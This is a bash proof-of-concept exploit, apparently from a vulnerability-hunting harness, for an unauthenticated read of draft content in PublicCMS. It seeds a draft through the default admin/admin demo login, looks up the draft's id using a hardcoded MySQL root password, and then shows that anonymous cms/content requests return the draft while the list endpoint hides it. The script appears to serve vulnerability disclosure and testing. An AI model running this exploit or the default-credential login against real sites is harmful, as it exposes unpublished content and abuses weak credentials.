#!/usr/bin/env bash
# VULN-005 — Unauthenticated disclosure of draft/disabled/scheduled content via cms/content
#
# The single-entity CMS read directive (cms/content) returns an entity after
# checking ONLY site.getId()==entity.getSiteId() — never status/disabled/publish
# window. The sibling cms/contentList applies the public-visibility predicate
# (STATUS_NORMAL, !disabled, publish/expiry window) for the same anonymous caller.
# So an anonymous caller can read non-public content by id that the list hides.
#
# This target's demo content lives in site 2 (Host: site2.dev.publiccms.com), so
# the anonymous reads carry that Host to select the tenant (still no auth cookie).
#
# Precondition seeding: create a DRAFT (status=0) content item via an admin. This
# target exposes the demo superuser admin/admin on site 2 (see VULN-001), used
# here purely to plant the non-public item.
#
# CONFIRMED when the anonymous single-entity directive returns the draft's title
# (status=0) while the anonymous list directive does NOT contain that id.
#
# Read-only exploit (the leak). Seeds one draft content row (random title).
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"       # resolves to the site holding the demo data
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-admin}"               # site-2 demo superuser (VULN-001)
CATEGORY_ID="${CATEGORY_ID:-14}"
MODEL_ID="${MODEL_ID:-article}"
OUT="$(cd "$(dirname "$0")" && pwd)"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
TITLE="DRAFT_SECRET_${S}"

echo "[INFO] VULN-005: unauth single-entity directive leaks non-public (draft) content"

# --- setup: admin session on the tenant, then plant a DRAFT content item -----
echo "[SETUP] admin login on Host $VHOST"
AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | sed -E 's/.*PUBLICCMS_ADMIN=([^;]+);.*/\1/')
[ -z "$AC" ] && { echo "[FAIL] could not obtain admin session for seeding"; exit 1; }
CSRF="${AC#*_}"
echo "[SETUP] planting draft content title=$TITLE (categoryId=$CATEGORY_ID modelId=$MODEL_ID draft=true)"
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" \
  --data-urlencode "_csrf=$CSRF" --data-urlencode "categoryId=$CATEGORY_ID" \
  --data-urlencode "modelId=$MODEL_ID" --data-urlencode "title=$TITLE" --data-urlencode "draft=true" \
  "$BASE_URL/admin/cmsContent/save"

# Resolve the just-created content id by its unique title. Content ids are
# snowflake values (not sequential/guessable) and the admin save returns only a
# generic success JSON, so we look it up in the DB. This is harness plumbing to
# locate the seeded precondition; the EXPLOIT below is a pure anonymous HTTP read.
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DRAFT_ID=$(docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N \
  -e "SELECT id FROM cms_content WHERE title='$TITLE' AND status=0 LIMIT 1;" 2>/dev/null | tr -d '\r')
echo "[SETUP] draft content id=$DRAFT_ID (status=0, planted this run)"
[ -z "$DRAFT_ID" ] && { echo "[FAIL] seeding failed (no draft id resolved)"; exit 1; }

# --- exploit: ANONYMOUS reads (no admin cookie), Host selects tenant ----------
echo "[STEP] anonymous GET /api/directive/cms/content?id=$DRAFT_ID"
LEAK=$(curl -s -H "Host: $VHOST" "$BASE_URL/api/directive/cms/content?id=$DRAFT_ID")
echo "$LEAK" > "$OUT/evidence/single_entity_leak.json"
printf 'GET /api/directive/cms/content?id=%s  (Host: %s, NO cookie)\n%s\n' "$DRAFT_ID" "$VHOST" "$LEAK" > "$OUT/response.txt"

echo "[STEP] anonymous GET /api/directive/cms/contentList (public-only)"
LIST=$(curl -s -H "Host: $VHOST" "$BASE_URL/api/directive/cms/contentList?pageSize=200")
echo "$LIST" > "$OUT/evidence/public_list.json"

LEAK_OK=$(printf '%s' "$LEAK" | python3 -c "import sys,json
d=json.load(sys.stdin);o=d.get('object') or {}
print('1' if o.get('title')=='$TITLE' and o.get('status')==0 else '0')" 2>/dev/null)
IN_LIST=$(printf '%s' "$LIST" | python3 -c "import sys,json
d=json.load(sys.stdin);ids=[str(x.get('id')) for x in d.get('page',{}).get('list',[])]
print('1' if '$DRAFT_ID' in ids else '0')" 2>/dev/null)

echo "[INFO] draft leaked by single-entity directive: $LEAK_OK ; present in public list: $IN_LIST"
if [ "$LEAK_OK" = "1" ] && [ "$IN_LIST" = "0" ]; then
  echo "[OK] exploit confirmed — anonymous caller read a DRAFT (status=0) that the list directive hides"
  exit 0
else
  echo "[FAIL] leak differential not observed"; exit 1
fi
# cleanup hint: DELETE FROM cms_content WHERE title LIKE 'DRAFT_SECRET_%';
